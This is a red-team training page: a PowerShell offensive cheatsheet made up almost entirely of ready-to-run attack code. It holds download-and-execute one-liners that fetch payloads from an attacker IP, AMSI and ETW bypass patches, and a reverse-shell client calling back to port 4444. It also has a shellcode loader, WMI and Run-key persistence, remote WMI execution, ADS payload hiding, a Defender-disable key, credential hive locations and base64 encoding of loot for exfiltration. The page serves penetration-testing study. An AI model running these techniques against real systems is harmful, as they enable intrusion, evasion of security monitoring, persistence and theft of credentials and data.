---
layout: training-page
title: "PowerShell Red Team Cheatsheet — Red Team Academy"
module: "Programming"
tags:
  - powershell
  - cheatsheet
  - red-team
  - offensive-programming
page_key: "prog-powershell-cheatsheet"
render_with_liquid: false
---

# PowerShell Red Team Cheatsheet

A quick-reference guide for offensive PowerShell operations. This cheatsheet focuses on the primitives and patterns you reach for repeatedly during engagements: memory execution, .NET interop, AMSI/ETW suppression, WMI abuse, and low-level Win32 access. For tool construction and complete tooling scripts, see the companion page [PowerShell Offensive Tools](powershell-offensive-tools.md).

---

## 1. Execution Basics

### Execution Policy Bypass

PowerShell's execution policy is a user-mode preference stored in the registry — it is not a security boundary. Several built-in bypass paths exist:

```powershell
# Bypass at process scope (no registry write, no admin required)
powershell.exe -ExecutionPolicy Bypass -File .\implant.ps1

# WindowStyle Hidden + NoProfile for cleaner process tree
powershell.exe -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -File .\implant.ps1

# Per-process override from within a running session
Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope Process -Force

# EncodedCommand: avoids quote escaping on the command line
$cmd = 'Write-Host "hello from encoded"'
$enc = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($cmd))
powershell.exe -EncodedCommand $enc

# Stdin bypass: pipe script content directly, no file on disk
Get-Content .\implant.ps1 | powershell.exe -NoProfile -
```

### In-Memory Execution with IEX

Invoke-Expression (IEX) evaluates a string as PowerShell. Combined with a download, nothing touches disk:

```powershell
# Canonical download-and-execute
IEX (New-Object System.Net.WebClient).DownloadString('http://10.10.14.5/payload.ps1')

# Alias forms (for basic string detection avoidance)
& ([scriptblock]::Create((New-Object Net.WebClient).DownloadString('http://10.10.14.5/p.ps1')))

# HTTPS with TLS 1.2 forced
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (New-Object Net.WebClient).DownloadString('https://10.10.14.5/payload.ps1')

# From a variable (ScriptBlock avoids some string-based detections)
$code = (New-Object Net.WebClient).DownloadString('http://10.10.14.5/p.ps1')
$sb   = [scriptblock]::Create($code)
& $sb
```

---

## 2. .NET Integration

PowerShell runs inside the .NET CLR. You have full access to every type in every loaded assembly, and you can load new assemblies at will.

### Loading Assemblies from Disk or Bytes

```powershell
# Load by name (GAC or load-path)
[System.Reflection.Assembly]::LoadWithPartialName('System.Windows.Forms')

# Load from file path
[System.Reflection.Assembly]::LoadFrom('C:\Tools\SharpHound.exe')

# Load from byte array (no file on disk)
$bytes = [System.IO.File]::ReadAllBytes('C:\Tools\payload.dll')
[System.Reflection.Assembly]::Load($bytes)

# Load from URL bytes (download + reflective load)
$wc    = New-Object System.Net.WebClient
$bytes = $wc.DownloadData('http://10.10.14.5/payload.dll')
[System.Reflection.Assembly]::Load($bytes)
```

### Type Resolution and Invocation

```powershell
# Get a type by full name from the loaded AppDomain
$t = [System.AppDomain]::CurrentDomain.GetAssemblies() |
     ForEach-Object { $_.GetType('Namespace.ClassName', $false) } |
     Where-Object { $_ }

# Invoke a static method via reflection
$method = $t.GetMethod('StaticMethodName', [Reflection.BindingFlags]'Static,NonPublic,Public')
$method.Invoke($null, @($arg1, $arg2))

# Invoke an instance method
$obj    = [Activator]::CreateInstance($t)
$method = $t.GetMethod('DoWork')
$method.Invoke($obj, @('arg'))
```

### Add-Type: Inline C# Compilation

Add-Type compiles C# at runtime and makes the resulting types available immediately. Useful for calling Win32 APIs or writing typed helpers:

```powershell
$src = @'
using System;
using System.Runtime.InteropServices;

public class WinAPI {
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr OpenProcess(uint access, bool inherit, uint pid);

    [DllImport("kernel32.dll")]
    public static extern bool CloseHandle(IntPtr handle);
}
'@
Add-Type -TypeDefinition $src -Language CSharp

$handle = [WinAPI]::OpenProcess(0x1F0FFF, $false, 1234)
[WinAPI]::CloseHandle($handle)
```

### Type Accelerators

```powershell
# Common accelerators
[adsi]          # System.DirectoryServices.DirectoryEntry
[adsisearcher]  # System.DirectoryServices.DirectorySearcher
[wmi]           # System.Management.ManagementObject
[wmiclass]      # System.Management.ManagementClass
[xml]           # System.Xml.XmlDocument

# Add a custom type accelerator (persists for the session)
$accelerators = [psobject].Assembly.GetType('System.Management.Automation.TypeAccelerators')
$accelerators::Add('mytype', [System.Net.Sockets.TcpClient])
$client = [mytype]::new('127.0.0.1', 4444)
```

---

## 3. AMSI Bypass Patterns

The Antimalware Scan Interface (AMSI) sits between PowerShell's script execution pipeline and security products. Before a scriptblock runs, `AmsiScanBuffer` is called; if it returns AMSI_RESULT_DETECTED the block is blocked. The approaches below are well-documented in public research and are included here for educational and defensive understanding.

### How AMSI Hooks PowerShell

1. `amsi.dll` is loaded into every PowerShell process.
2. `AmsiScanBuffer` is called for each scriptblock, encoded command, and interactive input.
3. Security products register as AMSI providers via COM and receive the buffer content.
4. If any provider returns a detection, execution is blocked with an error.

### amsiInitFailed Reflection Patch

Setting the private `amsiInitFailed` field to `$true` on the `AmsiUtils` class causes AMSI initialisation to report failure, disabling subsequent scans for the session:

```powershell
# Educational reconstruction — widely documented since 2016
$amsiType  = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
$initField = $amsiType.GetField('amsiInitFailed', 'NonPublic,Static')
$initField.SetValue($null, $true)
```

### AmsiScanBuffer NOP Patch via P/Invoke

A more robust approach patches the native function bytes directly in memory so the function always returns AMSI_RESULT_CLEAN (1):

```powershell
Add-Type -TypeDefinition @'
using System;
using System.Runtime.InteropServices;

public class AmsiFix {
    [DllImport("kernel32")] public static extern IntPtr GetProcAddress(IntPtr h, string p);
    [DllImport("kernel32")] public static extern IntPtr LoadLibrary(string n);
    [DllImport("kernel32")] public static extern bool VirtualProtect(IntPtr a, UIntPtr s, uint p, out uint o);
}
'@ -Language CSharp

$lib  = [AmsiFix]::LoadLibrary("amsi.dll")
$addr = [AmsiFix]::GetProcAddress($lib, "AmsiScanBuffer")
$old  = 0
[AmsiFix]::VirtualProtect($addr, [UIntPtr]::new(8), 0x40, [ref]$old) | Out-Null
$patch = [byte[]](0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)   # mov eax,0x80070057; ret
[Runtime.InteropServices.Marshal]::Copy($patch, 0, $addr, $patch.Length)
```

### ETW NOP Pattern

Event Tracing for Windows (`EtwEventWrite`) is another telemetry channel. The same VirtualProtect + NOP approach suppresses ETW script-block logging at the native level:

```powershell
Add-Type -TypeDefinition @'
using System;
using System.Runtime.InteropServices;
public class EtwFix {
    [DllImport("kernel32")] public static extern IntPtr GetProcAddress(IntPtr h, string p);
    [DllImport("ntdll")]    public static extern IntPtr NtTraceEvent(IntPtr r, uint f, uint c, IntPtr d);
    [DllImport("kernel32")] public static extern bool VirtualProtect(IntPtr a, UIntPtr s, uint p, out uint o);
    [DllImport("kernel32")] public static extern IntPtr LoadLibrary(string n);
}
'@ -Language CSharp

$ntdll = [EtwFix]::LoadLibrary("ntdll.dll")
$addr  = [EtwFix]::GetProcAddress($ntdll, "EtwEventWrite")
$old   = 0
[EtwFix]::VirtualProtect($addr, [UIntPtr]::new(1), 0x40, [ref]$old) | Out-Null
$nop   = [byte[]](0xC3)   # ret
[Runtime.InteropServices.Marshal]::Copy($nop, 0, $addr, $nop.Length)
```

---

## 4. WMI / CIM Operations

WMI and CIM are the same underlying repository; `Get-CimInstance` uses DCOM/WinRM while the older `Get-WmiObject` uses DCOM only. CIM cmdlets are preferred in PowerShell 7.

### Querying Classes

```powershell
# List running processes (local)
Get-CimInstance -ClassName Win32_Process | Select-Object Name, ProcessId, CommandLine

# Remote CIM query over WinRM
$session = New-CimSession -ComputerName 'srv01' -Credential (Get-Credential)
Get-CimInstance -CimSession $session -ClassName Win32_Service |
    Where-Object { $_.StartMode -eq 'Auto' -and $_.State -ne 'Running' }

# WQL filter
Get-CimInstance -Query "SELECT * FROM Win32_Process WHERE Name = 'lsass.exe'"
```

### Remote Process Creation via WMI

```powershell
# Classic method — returns process ID and return value
$wmi  = [wmiclass]"\\srv01\root\cimv2:Win32_Process"
$args = @{ CommandLine = 'cmd.exe /c whoami > C:\Windows\Temp\out.txt' }
$result = $wmi.Create($args.CommandLine)
# $result.ReturnValue -eq 0 means success; $result.ProcessId has the PID

# CIM equivalent
Invoke-CimMethod -ClassName Win32_Process -MethodName Create `
    -Arguments @{ CommandLine = 'cmd.exe /c whoami > C:\Windows\Temp\out.txt' } `
    -CimSession $session
```

### WMI Event Subscription for Persistence

Three objects make up a WMI subscription: a filter (trigger), a consumer (action), and a binding:

```powershell
$filterArgs = @{
    EventNamespace = 'root\cimv2'
    Name           = 'UpdateCheck'
    Query          = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_LocalTime' AND TargetInstance.Hour = 8"
    QueryLanguage  = 'WQL'
}
$filter = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments $filterArgs

$consumerArgs = @{
    Name             = 'UpdateCheckConsumer'
    CommandLineTemplate = 'powershell.exe -WindowStyle Hidden -EncodedCommand <base64>'
}
$consumer = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments $consumerArgs

$bindingArgs = @{
    Filter   = $filter
    Consumer = $consumer
}
Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments $bindingArgs
```

### Removing a WMI Subscription

```powershell
Get-WMIObject -Namespace root\subscription -Class __EventFilter        | Where-Object { $_.Name -eq 'UpdateCheck' }        | Remove-WmiObject
Get-WMIObject -Namespace root\subscription -Class CommandLineEventConsumer | Where-Object { $_.Name -eq 'UpdateCheckConsumer' } | Remove-WmiObject
Get-WMIObject -Namespace root\subscription -Class __FilterToConsumerBinding | Remove-WmiObject
```

---

## 5. Registry Operations

### Reading Keys and Values

```powershell
# Read a single value
Get-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'OneDrive'

# Read all values under a key
Get-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Lsa'

# Using the registry provider directly
(Get-Item -Path 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion').GetValue('ProductName')
```

### Writing Run Keys

```powershell
# HKCU does not require elevation
New-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' `
    -Name 'Updater' -Value 'C:\Users\Public\update.exe' -PropertyType String -Force

# HKLM requires elevation
New-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run' `
    -Name 'SvcUpdater' -Value 'C:\Windows\svcupdate.exe' -PropertyType String -Force

# RunOnce (executes once then deletes itself)
New-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\RunOnce' `
    -Name 'Setup' -Value 'C:\Users\Public\setup.exe' -PropertyType String -Force
```

### Remote Registry (requires RemoteRegistry service)

```powershell
# Open a remote base key
$reg     = [Microsoft.Win32.RegistryKey]::OpenRemoteBaseKey('LocalMachine', 'srv01')
$subKey  = $reg.OpenSubKey('SOFTWARE\Microsoft\Windows\CurrentVersion\Run', $true)
$subKey.SetValue('Persist', 'C:\Windows\Temp\persist.exe', [Microsoft.Win32.RegistryValueKind]::String)
$subKey.Close()
$reg.Close()
```

### Useful Offensive Registry Locations

```powershell
# Credential-related
'HKLM:\SAM\SAM'                                                    # SAM database (SYSTEM only)
'HKLM:\SECURITY\Policy\Secrets'                                    # LSA secrets (SYSTEM only)
'HKCU:\Software\SimonTatham\PuTTY\Sessions'                        # PuTTY saved sessions / creds
'HKCU:\Software\Microsoft\Terminal Server Client\Servers'          # RDP saved servers

# AlwaysInstallElevated (privesc)
'HKLM:\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated'
'HKCU:\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated'

# Disable defender via policy key (requires elevation)
'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\DisableAntiSpyware'
```

---

## 6. P/Invoke and Memory Operations

### DllImport via Add-Type

The `DllImport` attribute in inline C# is the standard way to call unmanaged functions:

```powershell
$sig = @'
using System;
using System.Runtime.InteropServices;

public class Mem {
    [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
    public static extern IntPtr VirtualAlloc(
        IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool WriteProcessMemory(
        IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, int nSize, out int lpNumberOfBytesWritten);

    [DllImport("kernel32.dll")]
    public static extern IntPtr CreateThread(
        IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress,
        IntPtr lpParameter, uint dwCreationFlags, out uint lpThreadId);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);
}
'@
Add-Type -TypeDefinition $sig -Language CSharp
```

### VirtualAlloc → Write → Execute Pattern

```powershell
# shellcode bytes — replace with real payload
[byte[]] $sc = 0xfc,0x48,0x83,0xe4,0xf0  # stub only

$addr  = [Mem]::VirtualAlloc([IntPtr]::Zero, [uint32]$sc.Length, 0x3000, 0x40)
$wrote = 0
[Mem]::WriteProcessMemory(
    [System.Diagnostics.Process]::GetCurrentProcess().Handle,
    $addr, $sc, $sc.Length, [ref]$wrote) | Out-Null

$tid    = 0
$thread = [Mem]::CreateThread([IntPtr]::Zero, 0, $addr, [IntPtr]::Zero, 0, [ref]$tid)
[Mem]::WaitForSingleObject($thread, 0xFFFFFFFF) | Out-Null
```

### Marshal Helpers

```powershell
# Byte array to IntPtr
$ptr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($bytes.Length)
[System.Runtime.InteropServices.Marshal]::Copy($bytes, 0, $ptr, $bytes.Length)

# Read a DWORD from an arbitrary address
[System.Runtime.InteropServices.Marshal]::ReadInt32($ptr)

# Write a byte
[System.Runtime.InteropServices.Marshal]::WriteByte($ptr, 0xC3)

# Free
[System.Runtime.InteropServices.Marshal]::FreeHGlobal($ptr)
```

---

## 7. Network Operations

### TCP Client (Raw Socket)

```powershell
# Basic reverse shell skeleton
$client  = New-Object System.Net.Sockets.TcpClient('10.10.14.5', 4444)
$stream  = $client.GetStream()
$writer  = New-Object System.IO.StreamWriter($stream)
$reader  = New-Object System.IO.StreamReader($stream)
$writer.AutoFlush = $true

while ($client.Connected) {
    $cmd    = $reader.ReadLine()
    $output = try { Invoke-Expression $cmd 2>&1 | Out-String } catch { $_.Exception.Message }
    $writer.WriteLine($output)
}
$client.Close()
```

### HTTP Downloads

```powershell
# WebClient (simplest)
$wc = New-Object System.Net.WebClient
$wc.DownloadFile('http://10.10.14.5/nc.exe', 'C:\Windows\Temp\nc.exe')
$data = $wc.DownloadData('http://10.10.14.5/payload.bin')
$text = $wc.DownloadString('http://10.10.14.5/stage.ps1')

# Invoke-WebRequest (returns response object)
$resp = Invoke-WebRequest -Uri 'http://10.10.14.5/file' -UseBasicParsing
[IO.File]::WriteAllBytes('C:\Windows\Temp\file', $resp.Content)

# HttpClient (.NET — supports async, HTTP/2, header control)
$hc  = New-Object System.Net.Http.HttpClient
$hc.DefaultRequestHeaders.Add('User-Agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)')
$res = $hc.GetAsync('http://10.10.14.5/payload.ps1').Result
$body = $res.Content.ReadAsStringAsync().Result
IEX $body
```

### Proxy Settings

```powershell
# Use system default proxy
$wc = New-Object System.Net.WebClient
$wc.Proxy = [System.Net.WebRequest]::DefaultWebProxy
$wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials

# Explicit proxy
$proxy = New-Object System.Net.WebProxy('http://proxy.corp.local:8080', $true)
$proxy.Credentials = New-Object System.Net.NetworkCredential('user', 'pass')
$wc.Proxy = $proxy
```

---

## 8. File Operations and NTFS Alternate Data Streams

### Basic File I/O

```powershell
# Read / write bytes
[IO.File]::ReadAllBytes('C:\Windows\Temp\payload.bin')
[IO.File]::WriteAllBytes('C:\Windows\Temp\payload.bin', $bytes)

# Read lines without locking
[IO.File]::ReadAllLines('C:\Windows\Temp\log.txt')

# Copy, move, delete
Copy-Item 'C:\source.exe' 'C:\dest.exe' -Force
Move-Item 'C:\source.exe' 'C:\Windows\Temp\' -Force
Remove-Item 'C:\Windows\Temp\artifact.txt' -Force
```

### NTFS Alternate Data Streams

ADS allow data to be hidden inside a file's named stream. The file appears normal in Explorer and `dir`; the ADS is invisible unless enumerated explicitly:

```powershell
# Write payload into an ADS on an innocuous file
$payload = [IO.File]::ReadAllBytes('C:\Tools\implant.exe')
Set-Content -Path 'C:\Windows\Temp\readme.txt' -Stream 'payload' -Value $payload -Encoding Byte

# Read it back
$hidden = Get-Content -Path 'C:\Windows\Temp\readme.txt' -Stream 'payload' -Encoding Byte

# List streams on a file
Get-Item -Path 'C:\Windows\Temp\readme.txt' -Stream *

# Execute directly from ADS (wscript, mshta, etc. can reference ADS paths)
# wscript.exe C:\Windows\Temp\readme.txt:script.js

# Store a PS script in ADS and execute from memory
$code = Get-Content -Path 'C:\Windows\Temp\readme.txt' -Stream 'stage2' -Raw
IEX $code
```

---

## 9. Credential Operations

### SecureString to Plaintext

```powershell
# Convert a SecureString back to a plain string
function ConvertFrom-SecureStringToPlainText {
    param([SecureString]$SecureString)
    $ptr = [Runtime.InteropServices.Marshal]::SecureStringToGlobalAllocUnicode($SecureString)
    try   { return [Runtime.InteropServices.Marshal]::PtrToStringUni($ptr) }
    finally { [Runtime.InteropServices.Marshal]::ZeroFreeGlobalAllocUnicode($ptr) }
}

# Usage
$ss    = ConvertTo-SecureString 'P@ssw0rd' -AsPlainText -Force
$plain = ConvertFrom-SecureStringToPlainText -SecureString $ss
```

### PSCredential Objects

```powershell
# Build a credential object from strings
$pass  = ConvertTo-SecureString 'P@ssw0rd' -AsPlainText -Force
$cred  = New-Object System.Management.Automation.PSCredential('DOMAIN\user', $pass)

# Network credential (for WebClient, SMB, etc.)
$netCred = $cred.GetNetworkCredential()
Write-Host $netCred.Password   # plain text
```

### DPAPI — ProtectedData

DPAPI encrypts data tied to the current user (or machine) account. Useful for storing exfiltrated secrets in a format that only decrypts on the same machine/user context:

```powershell
Add-Type -AssemblyName System.Security

# Encrypt (CurrentUser scope)
$plain     = [Text.Encoding]::UTF8.GetBytes('s3cr3t_data')
$entropy   = [Text.Encoding]::UTF8.GetBytes('optional_entropy_salt')
$encrypted = [Security.Cryptography.ProtectedData]::Protect(
    $plain, $entropy, [Security.Cryptography.DataProtectionScope]::CurrentUser)

# Store as base64
$b64 = [Convert]::ToBase64String($encrypted)

# Decrypt (same user context required)
$bytes  = [Convert]::FromBase64String($b64)
$result = [Security.Cryptography.ProtectedData]::Unprotect(
    $bytes, $entropy, [Security.Cryptography.DataProtectionScope]::CurrentUser)
[Text.Encoding]::UTF8.GetString($result)
```

---

## 10. Useful One-Liners

### Download and Execute

```powershell
# Shortest download-exec
IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.5/r.ps1')

# With TLS 1.2
[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;IEX(New-Object Net.WebClient).DownloadString('https://10.10.14.5/r.ps1')

# Certutil decode (LOLBin)
# certutil.exe -decode encoded.b64 payload.exe
```

### Base64 Encode / Decode

```powershell
# Encode a command (Unicode — required for -EncodedCommand)
$cmd = 'Get-Process | Select-Object Name,Id | ConvertTo-Json'
[Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($cmd))

# Decode
[Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBlAHQALQBQAHIAbwBjAGUAcwBzAA=='))

# Encode a file to base64 string (for exfil)
[Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\Windows\Temp\loot.txt'))
```

### Hash a File

```powershell
Get-FileHash 'C:\Windows\System32\ntdll.dll' -Algorithm SHA256 | Select-Object -ExpandProperty Hash
```

### WMI Remote Exec One-Liner

```powershell
([wmiclass]"\\TARGET\root\cimv2:Win32_Process").Create('cmd.exe /c calc.exe')
```

### PS Remoting One-Liner

```powershell
Invoke-Command -ComputerName srv01 -Credential (Get-Credential) -ScriptBlock { whoami; hostname }
```

### JSON Pipeline

```powershell
Get-Process | Select-Object Name,Id,CPU | ConvertTo-Json -Depth 3 | Out-File C:\Windows\Temp\procs.json
```

### Port Check Without Tools

```powershell
Test-NetConnection -ComputerName 10.10.14.5 -Port 445 | Select-Object -ExpandProperty TcpTestSucceeded
```

### List Local Admins

```powershell
Get-LocalGroupMember -Group Administrators | Select-Object Name, ObjectClass
```

### Find Writable Directories in PATH

```powershell
$env:PATH -split ';' | Where-Object { $_ -and (Test-Path $_) } | ForEach-Object {
    $acl = Get-Acl $_
    $acl.Access | Where-Object {
        $_.IdentityReference -match 'Everyone|Users|Authenticated Users' -and
        $_.FileSystemRights -match 'Write|FullControl|Modify'
    } | ForEach-Object { [PSCustomObject]@{ Path = $_; Rights = $_.FileSystemRights } }
}
```

---

## Resources

- [PowerShell Documentation — Microsoft Learn](https://learn.microsoft.com/en-us/powershell/)
- [AMSI Overview — Microsoft](https://learn.microsoft.com/en-us/windows/win32/amsi/antimalware-scan-interface-portal)
- [PowerShell Script Block Logging — Microsoft](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_logging_windows)
- [LOLBAS Project](https://lolbas-project.github.io/)
- [PayloadsAllTheThings — PowerShell](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Powershell%20-%20Cheatsheet.md)
- [pinvoke.net — Win32 API Signatures](http://pinvoke.net/)
- [ired.team — Red Teaming Experiments](https://www.ired.team/)
- [Sektor7 Malware Dev Essentials](https://institute.sektor7.net/)
